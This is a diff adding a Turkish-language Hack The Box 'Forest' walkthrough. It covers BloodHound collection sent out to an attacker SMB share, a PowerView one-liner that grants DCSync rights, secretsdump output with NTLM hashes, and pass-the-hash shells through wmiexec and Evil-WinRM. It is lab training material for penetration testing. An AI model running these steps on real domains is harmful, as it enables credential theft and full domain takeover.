@@ -687,7 +687,357 @@ Bu iki komut arasındaki fark, biri SharpHound.ps1 dosyasını indirip çalışt
 
 ---
 
-Sonuçları exfil etmek için smbserver.py kullanacağım. Benim kutumda:
+Sonuçları exfil etmek için `smbserver.py` kullanacağım. Benim kutumda:
+
+```
+root@kali# smbserver.py share . -smb2support -username df -password df
+Impacket v0.9.19-dev - Copyright 2018 SecureAuth Corporation
+
+[*] Config file parsed                                   
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed                                   
+[*] Config file parsed                                   
+[*] Config file parsed     
+```
+
+
+Şimdi Forest'ta:
+
+```
+*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> net use \\10.10.14.6\share /u:df df
+The command completed successfully.
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> copy 20191018035324_BloodHound.zip \\10.10.14.6\share\
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> del 20191018035324_BloodHound.zip   
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> net use /d \\10.10.14.6\share
+\\10.10.14.6\share was deleted successfully.
+```
+
+
+#### Load Data
+
+Bloodhound'un kurulumunu [Reel](https://0xdf.gitlab.io/2018/11/10/htb-reel.html#bloodhound) yazımda anlatmıştım. Verileri yüklemek için
+
+![Pasted image 20250106175637.png](/img/user/Pasted%20image%2020250106175637.png)
+
+butonuna tıklıyorum ve zip exfil'imi seçiyorum. “ Queries” altında, “Find Shorter Paths to Domain Admin” seçeneğine tıklayacağım ve aşağıdaki grafiği elde edeceğim:
+
+![Pasted image 20250106175703.png](/img/user/Pasted%20image%2020250106175703.png)
+
+---
+Grafik, bir Active Directory ortamındaki kullanıcılar ve gruplar arasındaki erişim ilişkilerini gösteriyor. Şu anki erişim noktanız olan svc-alfresco@HTB.LOCAL'dan Administrator@HTB.LOCAL (Domain Admins grubunun üyesi) seviyesine erişmek için hangi adımları izlemeniz gerektiğini açıklıyor.
+
+### Grafik Üzerinden Anlamı:
+
+1. svc-alfresco@HTB.LOCAL: Şu anda erişiminiz olan kullanıcı hesabı.
+    
+    - Bu hesap, **Service Accounts@HTB.LOCAL grubunun bir üyesi.
+2. **Service Accounts@HTB.LOCAL:
+    
+    - Bu grup, **Privileged IT Accounts@HTB.LOCAL grubunun bir üyesi.
+3. **Privileged** IT Accounts@HTB.LOCAL:
+    
+    - Bu grup, Account Operators@HTB.LOCAL grubunun bir üyesi.
+4. Account Operators@HTB.LOCAL:
+    
+    - Bu grup, **Exchange Windows Permissions@HTB.LOCAL grubunun bir üyesi.
+5. **Exchange Windows Permissions@HTB.LOCAL:
+    
+    - Bu grup, Active Directory'de **HTB.LOCAL** domainine yazma yetkisine sahip.
+6. **HTB.LOCAL**:
+    
+    - Domain üzerinde değişiklik yapma yetkisi sayesinde Administrator@HTB.LOCAL hesabına erişebilirsiniz.
+    - Bu hesap **Domain Admins@HTB.LOCAL grubunun bir üyesidir, yani en üst düzey yetkilere sahiptir.
+
+### "İki sıçrama" Ne Anlama Geliyor?
+
+Bu terim, erişim sürecindeki kritik adımları ifade eder:
+
+1. **svc-alfresco'dan Privileged IT Accounts'a** erişim sağlama.
+    - Örneğin, svc-alfresco'nun şifre bilgileri veya bir grup üyesi olarak sağladığı yetkilerle yukarıdaki gruba erişim kazanabilirsiniz.
+2. **Privileged IT Accounts'dan Administrator'a erişim sağlama.**
+    - Burada, bir exploit, şifre yakalama, veya grup yetkilerinden faydalanarak en üst seviyeye çıkarsınız.
+
+---
 
 
 
+### Path
+
+Şu anki erişimim olan svc-alfresco'dan Domain Admins grubunda bulunan Administrator'a geçmek için iki sıçrama gerekiyor.
+
+
+### Exchange Windows İzinleri Grubuna Katılın
+
+Kullanıcım, Account Operators'ın bir üyesi olan Privileged IT Account'un bir üyesi olan Service Account'ta olduğu için, temelde kullanıcım Account Operators'ın bir üyesi gibidir. Ve Account Operators, Exchange Windows Permissions grubunda Generic All ayrıcalığına sahiptir. Bloodhound'da kenara sağ tıklayıp help'i seçersem, açılan pencerede bir “Abuse Info” sekmesi görüntüleniyor:
+
+![Pasted image 20250106182642.png](/img/user/Pasted%20image%2020250106182642.png)
+
+Bu, bunun nasıl kötüye kullanılacağına dair tam bir arka plan veriyor ve aşağı kaydırırsam bir örnek görüyorum:
+
+```
+Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred
+```
+
+Ben de kullanabilirim:
+
+```
+net group "Exchange Windows Permissions" svc-alfresco /add /domain
+```
+
+
+#### Grant DCSync Privileges
+
+Şimdi Exchange Windows Permissions grubunun üyelerinin domain üzerinde WriteDacl yetkisine sahip olduğu gerçeğini kullanacağım. Yine help'e baktığımda, çalıştırabileceğim komutları gösteriyor:
+
+```
+$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('TESTLABdfm.a', $SecPassword)
+Add-DomainObjectAcl -Credential $Cred -TargetIdentity testlab.local -Rights DCSync
+```
+
+
+Bunu yaptıktan sonra, lokal olarak Mimikatz ile ya da Kali kutumdan secretsdump.py ile bir DCSync saldırısı gerçekleştirebilirim, çünkü DCSync yalnızca TCP 445, TCP 135 ve bir TCP RPC portuna (49XXX) erişim gerektirir. (Bunu nasıl bildim? Beyond Root'ta inceleyeceğim.)
+
+
+### Exploit
+
+#### Timeout
+
+Bu saldırıyı gerçekleştirmeye çalıştığımda, deneme yanılma yöntemi kafamı karıştırdı. Kullanıcımı Exchange Windows Permissions grubuna ekliyor ve gerekli komutları çalıştırıyordum ama işe yaramıyordu. Sonra net user svc-alfreso komutunu çalıştırdım ve artık grupta değildim. Görünüşe göre burada bir temizlik yapılıyor (Beyond Root'ta bundan yararlanacağım), bu yüzden hızlı hareket etmem gerekiyor.
+
+Local olarak çalıştırmak için tek satırlık bir komut oluşturacağım. İlk komut için kimlik bilgilerini iletmeme gerek yok, çünkü bu haklara sahip bir kullanıcı olarak zaten çalışıyorum. Ancak ikinci komut için kimlik bilgilerini iletmem gerekti. Tahminimce, oturum ilk komuttan itibaren yeni grupta olduğumu henüz bilmiyor ve kimlik bilgilerini iletmek bunu yeniliyor.
+
+```
+Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members svc-alfresco; $username = "htb\svc-alfresco"; $password = "s3rvice"; $secstr = New-Object -TypeName System.Security.SecureString; $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}; $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr; Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync
+```
+
+Bunu Forest üzerinde çalıştırdığımda hata vermeden geri dönüyor:
+
+```
+*Evil-WinRM* PS C:\> Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members svc-alfresco; $username = "htb\svc-alfresco"; $password = "s3rvice"; $secstr = New-Object -TypeName System.Security.SecureString; $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}; $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr; Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync
+```
+
+Ve kullanıcıyı yeni grupta görebiliyorum:
+
+```
+*Evil-WinRM* PS C:\> net group 'Exchange Windows Permissions'
+Group name     Exchange Windows Permissions
+Comment        This group contains Exchange servers that run Exchange cmdlets on behalf of users via the management service. Its members have permission to read and modify all Windows accounts and groups. This group should not be deleted.
+
+Members
+-------------------------------------------------------------------------------
+svc-alfresco             
+The command completed successfully.
+```
+
+Ayrıca secretsdump.py dosyasını çalıştırabilir ve hash'leri alabilirim:
+
+```
+root@kali# secretsdump.py svc-alfresco:s3rvice@10.10.10.161
+Impacket v0.9.19-dev - Copyright 2018 SecureAuth Corporation
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+...[snip]...
+[*] Cleaning up... 
+```
+
+
+### Alternative Tool: Aclpwn
+
+Bu exploit işlemini otomatikleştirecek bir araç var, [aclpwn](https://github.com/fox-it/aclpwn.py). Çalıştırdığımda, ona başlamak istediğim kullanıcıyı ve ne elde etmek istediğimi ( domain access) iletiyorum, o da yolları arıyor, bana hangi yolu kullanacağımı soruyor ve sonra çalıştırıyor:
+
+```
+root@kali# aclpwn -f svc-alfresco -t htb.local --domain htb.local --server 10.10.10.161
+Please supply the password or LM:NTLM hashes of the account you are escalating from: 
+[!] Unsupported operation: GenericAll on EXCH01.HTB.LOCAL (Computer)
+[-] Invalid path, skipping
+[+] Path found!
+Path [0]: (SVC-ALFRESCO@HTB.LOCAL)-[MemberOf]->(SERVICE ACCOUNTS@HTB.LOCAL)-[MemberOf]->(PRIVILEGED IT ACCOUNTS@HTB.LOCAL)-[MemberOf]->(ACCOUNT OPERATORS@HTB.LOCAL)-[GenericAll]->(EXCHANGE TRUSTED SUBSYSTEM@HTB.LOCAL)-[MemberOf]->(EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL)-[WriteDacl]->(HTB.LOCAL)
+[!] Unsupported operation: GetChanges on HTB.LOCAL (Domain)
+[-] Invalid path, skipping
+[+] Path found!
+Path [1]: (SVC-ALFRESCO@HTB.LOCAL)-[MemberOf]->(SERVICE ACCOUNTS@HTB.LOCAL)-[MemberOf]->(PRIVILEGED IT ACCOUNTS@HTB.LOCAL)-[MemberOf]->(ACCOUNT OPERATORS@HTB.LOCAL)-[GenericAll]->(EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL)-[WriteDacl]->(HTB.LOCAL)
+Please choose a path [0-1] 1
+[-] Memberof -> continue
+[-] Memberof -> continue
+[-] Memberof -> continue
+[-] Adding user SVC-ALFRESCO to group EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL
+[+] Added CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local as member to CN=Exchange Windows Permissions,OU=Microsoft Exchange Security Groups,DC=htb,DC=local
+[-] Re-binding to LDAP to refresh group memberships of SVC-ALFRESCO@HTB.LOCAL
+[+] Re-bind successful
+[-] Modifying domain DACL to give DCSync rights to SVC-ALFRESCO
+[+] Dacl modification successful
+[+] Finished running tasks
+[+] Saved restore state to aclpwn-20191019-215508.restore
+```
+
+
+### Dump Hashes
+
+Now, I can run `secretsdump.py`:
+
+```
+root@kali# secretsdump.py svc-alfresco:s3rvice@10.10.10.161
+Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+...[snip]...
+```
+
+
+### Shell
+
+Administrator için hash'ler ile wmiexec gibi bir araç ile bağlantı kurabilirim:
+
+```
+root@kali# wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 htb.local/administrator@10.10.10.161
+Impacket v0.9.19-dev - Copyright 2018 SecureAuth Corporation
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\>whoami
+htb\administrator
+```
+
+Evil-WinRM ile de devam edebilirim:
+
+```
+root@kali# ruby /opt/evil-winrm/evil-winrm.rb -i 10.10.10.161 -u administrator -p aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
+
+Info: Starting Evil-WinRM shell v1.7
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+htb\administrator
+```
+
+Her iki durumda da, oradan root.txt dosyasını alabilirim:
+
+```
+C:\users\administrator\desktop>type root.txt
+f048153f************************
+```
+
+
+## Beyond Root
+
+### DCSync Ports
+
+DCSync saldırısına hangi portların dahil olduğunu merak ettim. Böylece, Wireshark açıkken, kullanıcıma DCSync erişimi vermek için oneliner'ımı çalıştırdım. Sonra tun0 üzerinde bir yakalama başlattım ve secretsdump.py dosyasını çalıştırdım. Tüm hash'ler tamamlandıktan sonra yakalamayı durdurdum.
+
+İstatistikler altında, bunu yükleyen Conversations'ı görmek için bir seçenek var:
+
+![Pasted image 20250106183559.png](/img/user/Pasted%20image%2020250106183559.png)
+
+Hostumun dört bağlantı başlattığını görebiliyorum, hepsi TCP (aksi takdirde UDP'nin ardından bir numara olurdu). İkisi 445'e, biri 135'e ve biri de 49667'ye. Tüm bu portlar nmap'te açıktı.
+
+135'e olan bağlantılar sadece bir sonraki bağlanmam gereken RPC portunu bildirmek içindi. Bu portu filtrelersem (tcp.port == 135), bağlantının kurulduğunu görebiliyorum ve kaldırılmadan önceki son pakette, IP ve port dahil olmak üzere nasıl bağlanılacağı hakkında bilgi var:
+
+![Pasted image 20250106183640.png](/img/user/Pasted%20image%2020250106183640.png)
+
+### Cleanup Script
+
+svc-alfresco kullanıcısını ekledikten sonra gruplardan kaldırılmasıyla ilgili sorunlar yaşadım. Administrator'ın Documents klasöründe aşağıdaki script'i buldum:
+
+```
+:\users\administrator\documents>type revert.ps1
+Import-Module C:\Users\Administrator\Documents\PowerView.ps1
+
+$users = Get-Content C:\Users\Administrator\Documents\users.txt
+
+while($true)
+
+{
+    Start-Sleep 60
+
+    Set-ADAccountPassword -Identity svc-alfresco -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "s3rvice" -Force)
+
+    Foreach ($user in $users) {
+        $groups = Get-ADPrincipalGroupMembership -Identity $user | where {$_.Name -ne "Service Accounts"}
+
+        Remove-DomainObjectAcl -PrincipalIdentity $user -Rights DCSync
+
+        if ($groups -ne $null){
+            Remove-ADPrincipalGroupMembership -Identity $user -MemberOf $groups -Confirm:$false
+        }
+    }
+}
+```
+
+
+Şu işlemleri döngü halinde yapıyor:
+
+1. 60 saniye bekliyor.
+2. **svc-alfresco** kullanıcısının şifresini "s3rvice" olarak sıfırlıyor.
+3. **Administrators** belgeler klasöründeki **users.txt** dosyasındaki her kullanıcı üzerinde döngü yapıyor:
+    - Her kullanıcı için DCSync yetkilerini kaldırıyor.
+    - Kullanıcıyı "Service Accounts" olarak adlandırılmamış tüm gruplardan çıkarıyor.
+
+Bu script, oturum açıldığında veya sistem başlatıldığında çalışmak zorunda. Tüm zamanlanmış görevlerin bir listesini alırsam, tam en üstte potansiyel bir görev görüyorum:
+
+```
+C:\>schtasks /query /fo TABLE
+
+Folder: \
+TaskName                                 Next Run Time          Status         
+======================================== ====================== ===============
+restore                                  N/A                    Running        
+...[snip]...
+```
+
+Detayların sorgulanması bunu doğruluyor:
+
+```
+C:\>schtasks /query /tn restore /v /fo list
+
+Folder: \
+HostName:                             FOREST
+TaskName:                             \restore
+Next Run Time:                        N/A
+Status:                               Running
+Logon Mode:                           Interactive/Background
+Last Run Time:                        10/19/2019 9:22:00 AM
+Last Result:                          267009
+Author:                               HTB\Administrator
+Task To Run:                          powershell.exe -ep bypass C:\Users\Administrator\Documents\revert.ps1
+Start In:                             N/A
+Comment:                              N/A
+Scheduled Task State:                 Enabled
+Idle Time:                            Disabled
+Power Management:                     Stop On Battery Mode, No Start On Batteries
+Run As User:                          SYSTEM
+Delete Task If Not Rescheduled:       Disabled
+Stop Task If Runs X Hours and X Mins: 72:00:00
+Schedule:                             Scheduling data is not available in this format.
+Schedule Type:                        At system start up
+Start Time:                           N/A
+Start Date:                           N/A
+End Date:                             N/A
+Days:                                 N/A
+Months:                               N/A
+Repeat: Every:                        N/A
+Repeat: Until: Time:                  N/A
+Repeat: Until: Duration:              N/A
+Repeat: Stop If Still Running:        N/A
+```
+
+Script sistem başlangıcında çalışır, sürekli olarak sıfırlanır ve uyur.
